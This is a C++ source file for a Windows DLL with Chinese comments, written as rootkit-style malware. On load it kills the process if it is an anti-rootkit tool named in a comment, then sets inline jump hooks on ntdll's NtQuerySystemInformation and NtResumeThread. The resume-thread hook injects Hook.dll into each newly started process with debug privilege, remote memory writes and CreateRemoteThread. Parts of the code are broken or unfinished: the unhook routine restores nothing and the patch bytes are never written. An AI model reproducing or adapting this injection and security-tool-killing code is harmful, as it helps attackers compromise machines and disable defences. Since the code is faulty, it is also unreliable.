// dllmain.cpp : 定义 DLL 应用程序的入口点。


#include "stdafx.h"
#include <stdio.h>

BOOL g_bHook = FALSE;

typedef LONG NTSTATUS;
#define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
#define STATUS_ACCESS_DENIED         ((NTSTATUS)0xC0000022L)
#define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)
typedef ULONG SYSTEM_INFORMATION_CLASS;
typedef ULONG THREADINFOCLASS;
typedef ULONG PROCESSINFOCLASS;
typedef ULONG KPRIORITY;
#define MEMORY_BASIC_INFORMATION_SIZE 28
// struct CLIENT_ID
typedef struct _CLIENT_ID {
	DWORD_PTR UniqueProcess;
	DWORD_PTR UniqueThread;
} CLIENT_ID, *PCLIENT_ID;
typedef struct _THREAD_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PNT_TIB TebBaseAddress;
	CLIENT_ID ClientId;
	KAFFINITY AffinityMask;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

typedef struct _PROCESS_BASIC_INFORMATION { // Information Class 0
	NTSTATUS ExitStatus;
	PVOID PebBaseAddress;
	KAFFINITY AffinityMask;
	KPRIORITY BasePriority;
	ULONG UniqueProcessId;
	ULONG InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef NTSTATUS(__stdcall *NTQUERYSYSTEMINFORMATION)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID               SystemInformation,
	IN ULONG                SystemInformationLength,
	OUT PULONG              ReturnLength OPTIONAL);

typedef NTSTATUS(__stdcall *NTRESUMETHREAD)(
	IN HANDLE ThreadHandle,
	OUT PULONG PreviousSuspendCount OPTIONAL
	);

typedef NTSTATUS(__stdcall *NTQUERYINFORMATIONTHREAD)(
	IN HANDLE ThreadHandle,
	IN THREADINFOCLASS ThreadInformationClass,
	OUT PVOID ThreadInformation,
	IN ULONG ThreadInformationLength,
	OUT PULONG ReturnLength OPTIONAL);


typedef NTSTATUS(__stdcall * NTQUERYINFORMATIONPROCESS)(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL);


NTQUERYSYSTEMINFORMATION g_pfNtQuerySystemInformation = NULL;
NTRESUMETHREAD g_pfNtResumeThread = NULL;
BYTE g_OldNtQuerySystemInformation[5] = { 0 }, g_NewNtQuerySystemInformation[5] = { 0 };
BYTE g_OldNtResumeThread[5] = { 0 }, g_NewNtResumeThread[5] = { 0 };
DWORD dwIdOld = 0;
CRITICAL_SECTION cs;

NTSTATUS __stdcall NewNtQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength);

NTSTATUS __stdcall NewNtResumeThread(IN HANDLE ThreadHandle,
	OUT PULONG PreviousSuspendCount OPTIONAL);


void WINAPI HookOn();
void WINAPI HookOff();

BOOL APIENTRY DllMain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		
		InitializeCriticalSection(&cs);
		char Name[MAX_PATH] = { 0 };
		GetModuleFileName(NULL, (LPWSTR)Name, MAX_PATH);
		MessageBox(NULL, (LPCWSTR)Name, L"Remote Dll", MB_OK);
		// 杀杀冰刃玩玩
		if (strstr(Name, "AH-OP.exe") != NULL)
		{
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,
				0,
				GetCurrentProcessId());
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}
		if (!g_bHook)
		{
			HookOn();
		}
#ifdef _DEBUG
		MessageBox(NULL, L"Process Attach", L"Remote Dll", MB_OK);
#endif

	}
	break;
	case DLL_THREAD_ATTACH:

		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		if (g_bHook)
		{
			HookOff();
#ifdef _DEBUG
			MessageBox(NULL, L"Off!", L"Hook Off", MB_OK);
#endif    
			DeleteCriticalSection(&cs);

		}
		break;
	}

	return TRUE;
}

BOOL EnableDebugPrivilege(BOOL fEnable) {

	// Enabling the debug privilege allows the application to see
	// information about service applications
	BOOL fOk = FALSE;    // Assume function fails
	HANDLE hToken;

	// Try to open this process's access token
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,
		&hToken)) {

		// Attempt to modify the "Debug" privilege
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

#define ThreadBasicInformation 0

void inject(HANDLE hProcess) {

	char CurPath[256] = { 0 };

	GetSystemDirectory((LPWSTR)CurPath, 256);
	strncat(CurPath, "\\Hook.dll", 9);

	PWSTR pszLibFileRemote = NULL;


	int len = (lstrlen((LPWSTR)CurPath) + 1) * 2;
	WCHAR wCurPath[256];
	MultiByteToWideChar(CP_ACP, 0, CurPath, -1, wCurPath, 256);

	EnableDebugPrivilege(1);

	pszLibFileRemote = (PWSTR)
		VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, pszLibFileRemote,
		(PVOID)wCurPath, len, NULL);

	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)
		GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

	HANDLE hRemoteThread = CreateRemoteThread(hProcess,
		NULL,
		0,
		pfnThreadRtn,
		pszLibFileRemote,
		0,
		NULL);
	WaitForSingleObject(hRemoteThread, INFINITE);
	CloseHandle(hRemoteThread);

	EnableDebugPrivilege(0);

}

NTSTATUS __stdcall NewNtResumeThread(IN HANDLE ThreadHandle,
	OUT PULONG PreviousSuspendCount OPTIONAL)
{

	NTSTATUS ret;
	NTSTATUS nStatus;
	NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;
	NTQUERYINFORMATIONTHREAD NtQueryInformationThread = NULL;
	THREAD_BASIC_INFORMATION ti;
	DWORD Pid = 0;

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

	NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,
		"NtQuerySystemInformation");
	NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll,
		"NtQueryInformationThread");

	if (NtQueryInformationThread == NULL)
	{
#ifdef _DEBUG
		MessageBox(NULL, L"can't get NtQueryInformationThread", L"", MB_OK);
#endif    

	}

	nStatus = NtQueryInformationThread(ThreadHandle,
		ThreadBasicInformation,
		(PVOID)&ti,
		sizeof(THREAD_BASIC_INFORMATION),
		NULL);

	if (nStatus != STATUS_SUCCESS)
	{
#ifdef _DEBUG
		MessageBox(NULL, L"fuck failed", L"", MB_OK);
#endif

	}

	Pid = (DWORD)(ti.ClientId.UniqueProcess);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, Pid);

	if (hProcess == NULL)
	{
#ifdef _DEBUG
		MessageBox(NULL, L"open process failed", L"", MB_OK);
#endif
	}

	BYTE FirstByte[1] = { 0 };
	// check if the process has been hooked
	ReadProcessMemory(hProcess, NtQuerySystemInformation, FirstByte, 1, NULL);

	// 已经被Hook了
	if (FirstByte[0] == 0xe9)
	{

		HookOff();
		ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);
		HookOn();

		CloseHandle(hProcess);

		return ret;
	}
	// 创建新进程的调用，Hook 之
	else
	{
		HookOff();
		inject(hProcess);
		ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);
		HookOn();

		CloseHandle(hProcess);
		return ret;
	}
}

NTSTATUS __stdcall NewNtQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength)
{
	NTSTATUS ntStatus;

	HookOff();
	ntStatus = g_pfNtQuerySystemInformation(SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);
	HookOn();

	return ntStatus;
}


void WINAPI HookOn()
{
	PMEMORY_BASIC_INFORMATION lpAllocBuffer = NULL;
	DWORD dwOldProtect, dwOldProtect2;
	HANDLE hProcess = NULL;


	dwIdOld = GetCurrentProcessId();
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwIdOld);
	if (hProcess == NULL)
		return;

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	g_pfNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,
		"NtQuerySystemInformation");

	if (g_pfNtQuerySystemInformation == NULL)
	{
		return;
	}

	g_pfNtResumeThread = (NTRESUMETHREAD)GetProcAddress(hNtdll, "NtResumeThread");

	if (g_pfNtResumeThread == NULL)
	{
		return;
	}

	EnterCriticalSection(&cs);

	_asm
	{
		lea edi, g_OldNtQuerySystemInformation
		mov esi, g_pfNtQuerySystemInformation
		cld
		mov ecx, 5
		rep movsb
		lea edi, g_OldNtResumeThread
		mov esi, g_pfNtResumeThread
		cld
		mov ecx, 5
		rep movsb
	}

	g_NewNtQuerySystemInformation[0] = 0xe9;
	g_NewNtResumeThread[0] = 0xe9;
	_asm
	{
		lea eax, NewNtQuerySystemInformation
		mov ebx, g_pfNtQuerySystemInformation
		sub eax, ebx
		sub eax, 5
		mov dword ptr[g_NewNtQuerySystemInformation + 1], eax
		lea eax, NewNtResumeThread
		mov ebx, g_pfNtResumeThread
		sub eax, ebx
		sub eax, 5
		mov dword ptr[g_NewNtResumeThread + 1], eax
	}

	LeaveCriticalSection(&cs);

	g_bHook = TRUE;
}

// 还原被修改的代码
void WINAPI HookOff()
{

	g_bHook = FALSE;
}